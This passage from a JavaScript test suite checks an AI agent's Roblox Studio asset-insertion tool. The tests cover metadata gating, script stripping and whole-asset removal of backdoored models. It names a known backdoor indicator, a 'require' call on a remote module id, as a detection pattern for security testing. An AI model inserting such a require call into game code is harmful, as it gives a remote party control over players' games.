 * because setting it to `undefined` is not the same shape as never sending it.
 */
function detailsFor(id, { asset = {}, creator = {}, voting = {}, fiatProduct = {}, omit = [] } = {}) {
  const a = {
    id,
    name: 'Low Poly Crate',
    typeId: 40,
    hasScripts: false,
    scriptCount: 0,
    visibilityStatus: 1,
    capabilities: {},
    modelTechnicalDetails: { objectMeshSummary: { triangles: 800, vertices: 500 } },
    ...asset,
  };
  for (const key of omit) delete a[key];
  return {
    data: [
      {
        asset: a,
        creator: { id: 1, name: 'Roblox', isVerifiedCreator: true, ...creator },
        voting: { upVotePercent: 96, voteCount: 400, ...voting },
        fiatProduct: { isFree: true, purchasable: true, ...fiatProduct },
      },
    ],
  };
}

/** Answer every details lookup with one body, and record nothing else. */
function serveDetails(body) {
  respond = () => ({ ok: true, status: 200, json: async () => body });
}

/** An AgentCtx over the fake Studio above. `library` is what search_asset_library would have added. */
function toolCtx(studio, { discovered = [], library = [] } = {}) {
  return {
    env: {},
    studioConnected: () => true,
    execStudioOp: (op, timeoutMs) => studio.bridge.execStudioOp(op, timeoutMs),
    createCheckpoint: async () => ({ error: 'checkpoints are not part of this path' }),
    addMemoryFact: async () => {},
    discoveredAssetIds: new Set(discovered),
    libraryAssetIds: new Set(library),
  };
}

const insert = async (ctx, assetId, parent = 'game.Workspace') => {
  const out = await T.runTool(ctx, 'insert_asset', JSON.stringify({ assetId, parent }));
  return { ...out, result: JSON.parse(out.resultForLlm) };
};

test('A BACKDOORED ASSET THAT REACHES insert_asset IS REMOVED WHOLE AND THE TOOL REFUSES', async () => {
  // The metadata swears there are no scripts. There is a `require(3163717554)` in the place.
  serveDetails(detailsFor(101));
  const studio = fakeStudio({
    scripts: [{ path: 'game.Workspace.Crate.Main', className: 'Script', source: REQUIRE_BACKDOOR }],
    classes: ['Model', 'MeshPart', 'Script'],
  });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);

  assert.equal(out.ok, false, 'a backdoored asset must be a tool failure, not a warning');
  assert.match(out.result.error, /refused and removed/);
  assert.deepEqual(out.result.removedWholeAsset, ['game.Workspace.Crate'], 'the whole asset goes, not just the script');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
  // The order is the security property: the place is read only after the insert, and the delete
  // only after the read.
  const calls = studio.state.calls;
  assert.ok(calls.indexOf('insert_asset') < calls.indexOf('list_scripts'));
  assert.ok(calls.indexOf('read_script') < calls.indexOf('delete_instances'));
  // The attacker's own Luau must not ride into the transcript.
  const blob = JSON.stringify(out);
  assert.equal(/require\(3163717554\)/.test(blob), false, 'no line of the removed source may reach the model');
  assert.equal(/a\.load\(game/.test(blob), false);
});

test('A PLAIN-SCRIPT ASSET IS STRIPPED AND THEN PROVEN CLEAN BY RE-LISTING THE PLACE', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({
    scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }],
    classes: ['Model', 'MeshPart', 'Script'],
  });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);

  assert.equal(out.ok, true, out.resultForLlm);
  assert.equal(out.result.scan, 'stripped');
  assert.deepEqual(out.result.inserted, ['game.Workspace.Crate']);
  assert.equal(out.result.stripped.length, 1);
  assert.equal(out.result.stripped[0].path, 'game.Workspace.Crate.Spin');
  assert.match(out.result.stripped[0].why, /script_present/);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate.Spin'], 'only the script goes — nothing malicious happened');
  // PROOF, not bookkeeping: the second listing is a real re-read of a place the fake actually
  // mutated, so removing the delete from the fake would fail this test.
  assert.equal(studio.state.calls.filter((c) => c === 'list_scripts').length, 2);
  assert.match(out.result.proven, /zero scripts remain/);
});

test('the clean case still runs the whole sequence — a clean asset is PROVEN clean, not assumed', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, true, out.resultForLlm);
  assert.equal(out.result.scan, 'clean');
  assert.deepEqual(out.result.stripped, []);
  assert.deepEqual(studio.state.deleted, []);
  for (const required of ['insert_asset', 'get_tree', 'list_scripts']) {
    assert.ok(studio.state.calls.includes(required), `${required} must run even for a clean asset`);
  }
});

test('A LIBRARY-DISCOVERED ID IS STILL VERIFIED — membership is provenance, never a skip', async () => {
  // The recorded bypass, exactly: a library row pointing at a Model id. Under the old code this id
  // was in discoveredAssetIds, so it went straight to Studio unresolved and unscanned.
  serveDetails(detailsFor(777, { asset: { typeId: 10, name: 'Free Admin Model' } }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [777], library: [777] }), 777);

  assert.equal(out.ok, false);
  assert.match(out.result.error, /was not verified/);
  assert.match(out.result.error, /Model is refused|typeId 10/);
  assert.equal(studio.state.calls.length, 0, 'nothing may touch the place when the gate refuses');
  assert.ok(fetched.some((u) => u.includes('assetIds=777')), 'the id must actually have been resolved');
});

test('a library id carrying scripts is refused on the SAME field the Creator Store path uses', async () => {
  serveDetails(detailsFor(778, { asset: { hasScripts: true, scriptCount: 3 } }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [778], library: [778] }), 778);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /carries Luau/);
  assert.equal(studio.state.calls.length, 0);
});

test('the library waiver is NARROW: price, votes and creator badge are waived, and they are named', async () => {
  // A Golem-uploaded Open Use mesh: no marketplace price, no votes, no verified badge. Refusing it
  // on those would refuse the entire library, so they are waived — and the waiver is reported.
  serveDetails(
    detailsFor(779, {
      creator: { id: 4242, name: 'Golem', isVerifiedCreator: false },
      voting: { upVotePercent: 0, voteCount: 0 },
      fiatProduct: { isFree: false },
    }),
  );
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [779], library: [779] }), 779);
  assert.equal(out.ok, true, out.resultForLlm);
  assert.ok(Array.isArray(out.result.waivedForLibraryAsset) && out.result.waivedForLibraryAsset.length > 0, 'a waiver that is not reported is a waiver nobody can audit');

  // The same asset from the Creator Store gets no such waiver.
  serveDetails(
    detailsFor(779, {
      creator: { id: 4242, name: 'Someone', isVerifiedCreator: false },
      voting: { upVotePercent: 0, voteCount: 0 },
      fiatProduct: { isFree: false },
    }),
  );
  const store = fakeStudio();
  const fromStore = await insert(toolCtx(store, { discovered: [779] }), 779);
  assert.equal(fromStore.ok, false, 'only a curated-library id may waive anything');
  assert.equal(store.state.calls.length, 0);
});

test('A DETAILS RESPONSE WITH hasScripts ABSENT IS REFUSED, NOT PASSED', async () => {
  // The undocumented endpoint renames or drops the field. `undefined === true` is false, which used
  // to read as "this asset carries no scripts" and pass the most important assertion in silence.
  serveDetails(detailsFor(101, { omit: ['hasScripts'] }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);

  assert.equal(out.ok, false, 'an absent field must fail closed');
  assert.match(out.result.error, /hasScripts/);
  assert.match(out.result.error, /never as false/);
  assert.equal(studio.state.calls.length, 0, 'the place is never touched on an unanswerable question');
  // Non-vacuity: the SAME fixture with the field present inserts fine, so the refusal is caused by
  // the absence and by nothing else in the payload.
  serveDetails(detailsFor(101));
  const ok = await insert(toolCtx(fakeStudio(), { discovered: [101] }), 101);
  assert.equal(ok.ok, true, ok.resultForLlm);
});

test('a non-boolean hasScripts is absence, not a value — "false" the string does not clear the gate', async () => {
  for (const bogus of ['false', 0, null, {}]) {
    serveDetails(detailsFor(101, { asset: { hasScripts: bogus } }));
    const studio = fakeStudio();
    const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
    assert.equal(out.ok, false, `hasScripts=${JSON.stringify(bogus)} should have failed closed`);
    assert.equal(studio.state.calls.length, 0);
  }
});

test('an id nobody discovered is still resolved before anything is inserted', async () => {
  serveDetails(detailsFor(999, { asset: { typeId: 10 } }));
  const studio = fakeStudio();
  const out = await insert(toolCtx(studio), 999);
  assert.equal(out.ok, false);
  assert.equal(studio.state.calls.length, 0);
  assert.equal(out.result.assetId, undefined);
});

test('a garbage assetId is refused without a request and without touching the place', async () => {
  const before = fetched.length;
  for (const bad of [0, -1, 1.5, 'abc']) {
    const studio = fakeStudio();
    const out = await insert(toolCtx(studio, { discovered: [0] }), bad);
    assert.equal(out.ok, false, String(bad));
    assert.equal(studio.state.calls.length, 0);
  }
  assert.equal(fetched.length, before, 'an invalid id must not reach the network');
});

test('an insert that fails half way leaves nothing behind: a failed strip discards the whole asset', async () => {
  serveDetails(detailsFor(101));
  // list_scripts works, read_script works, delete_instances does not.
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }], failOn: 'delete_instances' });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /could not be deleted/);
  // The discard itself also failed, so the tool says so instead of claiming the place is clean.
  assert.deepEqual(out.result.manualCleanupRequired, ['game.Workspace.Crate']);
});

test('a script that survives removal is a refusal — the re-list is trusted over our own bookkeeping', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }] });
  // A Studio that reports success on the delete and quietly keeps the script.
  const realOp = studio.bridge.execStudioOp;
  studio.bridge.execStudioOp = async (op, ms) => (op.op === 'delete_instances' && !op.paths.includes('game.Workspace.Crate') ? { ok: true, data: {} } : realOp(op, ms));
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /survived removal/);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate'], 'the whole asset goes when it cannot be proven clean');
});

test('an unenumerable subtree is discarded — a tree that cannot be walked is not an empty one', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({ failOn: 'get_tree' });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('more scripts than the scan cap is refused on count alone, at the tool boundary too', async () => {
  serveDetails(detailsFor(101));
  const many = Array.from({ length: SCAN_LIMITS.maxScripts + 3 }, (_, i) => ({ path: `game.Workspace.Crate.S${i}`, className: 'Script', source: PLAIN_SCRIPT }));
  const studio = fakeStudio({ scripts: many });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.equal(out.ok, false);
  assert.match(out.result.error, /scan cap/);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
  assert.equal(studio.state.calls.filter((c) => c === 'read_script').length, 0, 'refused on count before a single source was read');
});

test('the tool result stays small enough to be worth re-sending on every later step', async () => {
  serveDetails(detailsFor(101));
  const studio = fakeStudio({
    scripts: Array.from({ length: 6 }, (_, i) => ({ path: `game.Workspace.Crate.S${i}`, className: 'Script', source: HTTP_SCRIPT.replace('https://', 'http://') })),
  });
  const out = await insert(toolCtx(studio, { discovered: [101] }), 101);
  assert.ok(out.resultForLlm.length < 1500, `a tool result of ${out.resultForLlm.length} chars is too much context to re-send`);
});

test('NO NETWORK: every request this section made went to the injected stub, and only to Roblox', () => {
  assert.ok(fetched.length > 5, 'the recorder should have seen the metadata gate work');
  for (const u of fetched) assert.match(u, /^https:\/\/apis\.roblox\.com\//, u);
});
